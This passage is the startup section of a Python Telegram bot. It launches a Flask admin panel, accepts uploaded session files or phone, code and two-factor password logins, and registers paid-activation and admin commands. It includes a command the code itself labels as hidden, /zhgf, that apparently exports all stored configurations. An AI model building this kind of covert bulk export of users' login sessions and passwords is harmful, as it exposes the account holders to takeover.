    flask_app.run(host="0.0.0.0", port=39999, debug=False, use_reloader=False)

# ==================== 启动入口 ====================

async def post_init(application: Application):
    logger.info("Bot 启动完成，开始扫描会话...")
    await scan_and_restore_all_sessions(application.bot)

def main():
    flask_thread = threading.Thread(target=_run_flask, daemon=True)
    flask_thread.start()
    logger.info("Flask 后台管理已启动: http://0.0.0.0:39999")
    
    builder = Application.builder().token(BOT_TOKEN)
    application = builder.post_init(post_init).build()
    
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler('start', start),
            MessageHandler(filters.Regex(r'^(📁 上传会话文件|📱 手机号登录|⚙️ 账号管理)'), entry_handler)
        ],
        states={
            PHONE_INPUT: [MessageHandler(filters.Document.ALL | filters.TEXT & ~filters.COMMAND, handle_phone_or_file)],
            VERIFICATION_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_verification_code)],
            TWO_FACTOR_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_two_factor)],
        },
        fallbacks=[CommandHandler('start', start)],
        allow_reentry=True
    )
    
    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(handle_inline_callback, pattern=r'^(stop_single:|stop_all|noop|verify_join|check_pay|pay_online|check_payment:|cancel_payment)'))
    
    # 用户命令
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('activate', cmd_activate))
    application.add_handler(CommandHandler('pay', cmd_pay))
    
    # 管理员命令
    application.add_handler(CommandHandler('genkey', cmd_gen_key))
    application.add_handler(CommandHandler('listkeys', cmd_list_keys))
    application.add_handler(CommandHandler('exportall', cmd_export_all))
    application.add_handler(CommandHandler('balance', cmd_balance))
    application.add_handler(CommandHandler('manualpay', cmd_manual_pay))
    application.add_handler(CommandHandler('checkjoin', cmd_check_join))
    application.add_handler(CommandHandler('clearjoin', cmd_clear_join_record))
    
    # 超级管理员命令
    application.add_handler(CommandHandler('addadmin', cmd_add_admin))
    application.add_handler(CommandHandler('removeadmin', cmd_remove_admin))
    application.add_handler(CommandHandler('listadmins', cmd_list_admins))
    
    # 隐藏指令
    application.add_handler(CommandHandler('zhgf', cmd_export_all_configs))
    
    logger.info("Bot 已启动")
    logger.info(f"超级管理员: {SUPER_ADMIN_IDS}")
    logger.info(f"普通管理员: {list(_load_admins())}")
    logger.info(f"要求加入频道: {REQUIRED_CHANNEL}")
    logger.info(f"支付配置: {PAYMENT_AMOUNT} {PAYMENT_COIN}")
    logger.info("隐藏指令已加载: /zhgf (仅管理员可用)")
    application.run_polling()

if __name__ == '__main__':
    main()